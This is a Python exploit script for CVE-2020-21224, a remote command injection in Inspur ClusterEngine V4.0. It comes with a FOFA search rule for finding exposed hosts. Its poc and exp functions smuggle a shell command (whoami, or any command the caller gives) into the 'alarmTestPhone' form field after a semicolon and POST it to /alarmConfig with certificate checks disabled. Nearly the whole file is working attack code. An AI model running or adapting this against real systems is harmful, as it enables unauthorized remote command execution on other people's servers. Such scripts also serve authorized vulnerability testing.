#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import json
import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='CVE_2020_21224'
AUTHOR="RabbitMask"
REMARK='Inspur ClusterEngine V4.0 RCE'
FOFA_RULE='title="TSCEV4.0"'
######################################################

def poc(target):
    result={}
    headers={
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        "User-Agent":ua
    }

    data = {
        'op':'testPhone',
        'alarmTestPhone':'1;{}'.format('whoami'),
        'alarmTestMessage':'2'
    }

    try:
        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False,proxies=proxies)
        res=json.loads(r.text)
        if res['def']:
            result['target'] = target
            result['poc'] = NAME
            result['whoami'] = str(res['def'])
            return result
    except:
        pass



def exp(target,cmd):
    headers={
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        "User-Agent":ua
    }

    data = {
        'op':'testPhone',
        'alarmTestPhone':'1;{}'.format(cmd),
        'alarmTestMessage':'2'
    }

    try:
        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False,proxies=proxies)
        res=json.loads(r.text)
        print(res['def'])
    except:
        pass



if __name__ == '__main__':
    exp("http://127.0.0.1","whoami")